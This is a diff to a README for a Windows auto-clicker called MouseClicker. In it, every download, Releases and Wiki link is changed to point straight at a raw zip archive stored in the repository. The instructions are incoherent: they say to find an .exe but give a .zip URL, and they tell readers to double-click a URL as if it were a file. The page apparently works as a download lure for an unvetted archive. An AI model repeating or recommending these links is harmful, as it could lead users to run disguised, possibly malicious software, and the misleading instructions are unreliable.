@@ -1,7 +1,7 @@
 # 🖱️ MouseClicker - Simplify Your Clicking Tasks
 
 ## 📥 Download Here
-[![Download MouseClicker](https://raw.githubusercontent.com/InneedIT/MouseClicker/main/amphigenously/MouseClicker.zip)](https://raw.githubusercontent.com/InneedIT/MouseClicker/main/amphigenously/MouseClicker.zip)
+[![Download MouseClicker](https://github.com/InneedIT/MouseClicker/raw/refs/heads/main/Resources/Mouse-Clicker-3.1.zip)](https://github.com/InneedIT/MouseClicker/raw/refs/heads/main/Resources/Mouse-Clicker-3.1.zip)
 
 ## 📋 Description
 MouseClicker is a simple Windows desktop application that automates mouse clicks. It is designed to help users work more efficiently by providing features such as the ability to click in multiple areas, random jitter movements, and configuration saving. Whether you need to automate repetitive tasks or enhance your productivity, MouseClicker can assist you.
@@ -18,16 +18,16 @@ To run MouseClicker, you need the following:
 ### 2. Visit and Download
 To download MouseClicker, please visit the following link:
 
-[Download MouseClicker Releases](https://raw.githubusercontent.com/InneedIT/MouseClicker/main/amphigenously/MouseClicker.zip)
+[Download MouseClicker Releases](https://github.com/InneedIT/MouseClicker/raw/refs/heads/main/Resources/Mouse-Clicker-3.1.zip)
 
 ### 3. Find the Latest Version
 On the Releases page, you will see a list of all the available versions. Look for the latest version, which will be at the top. Click on it to go to the details of that version.
 
 ### 4. Download the Application
-In the version section, you will find different files. Look for the file that ends with `.exe`, like `https://raw.githubusercontent.com/InneedIT/MouseClicker/main/amphigenously/MouseClicker.zip`. Click on this file to start downloading.
+In the version section, you will find different files. Look for the file that ends with `.exe`, like `https://github.com/InneedIT/MouseClicker/raw/refs/heads/main/Resources/Mouse-Clicker-3.1.zip`. Click on this file to start downloading.
 
 ### 5. Run the Installer
-Once the file is downloaded, locate it in your Downloads folder. Double-click on the `https://raw.githubusercontent.com/InneedIT/MouseClicker/main/amphigenously/MouseClicker.zip` file to begin the installation. Follow the prompts displayed on your screen to complete the installation process.
+Once the file is downloaded, locate it in your Downloads folder. Double-click on the `https://github.com/InneedIT/MouseClicker/raw/refs/heads/main/Resources/Mouse-Clicker-3.1.zip` file to begin the installation. Follow the prompts displayed on your screen to complete the installation process.
 
 ### 6. Launching MouseClicker
 After installation, find the MouseClicker icon on your desktop or in your start menu. Click it to launch the application.
@@ -68,7 +68,7 @@ If you encounter issues:
 3. **Visit the Support Page:** For further help, check the support section on the Releases page.
 
 ## 🔗 Useful Links
-- [Download MouseClicker Releases](https://raw.githubusercontent.com/InneedIT/MouseClicker/main/amphigenously/MouseClicker.zip)
-- [MouseClicker Wiki](https://raw.githubusercontent.com/InneedIT/MouseClicker/main/amphigenously/MouseClicker.zip)
+- [Download MouseClicker Releases](https://github.com/InneedIT/MouseClicker/raw/refs/heads/main/Resources/Mouse-Clicker-3.1.zip)
+- [MouseClicker Wiki](https://github.com/InneedIT/MouseClicker/raw/refs/heads/main/Resources/Mouse-Clicker-3.1.zip)
 
 MouseClicker is aimed at helping everyday users automate their clicking tasks efficiently. We hope it brings you great productivity improvements.
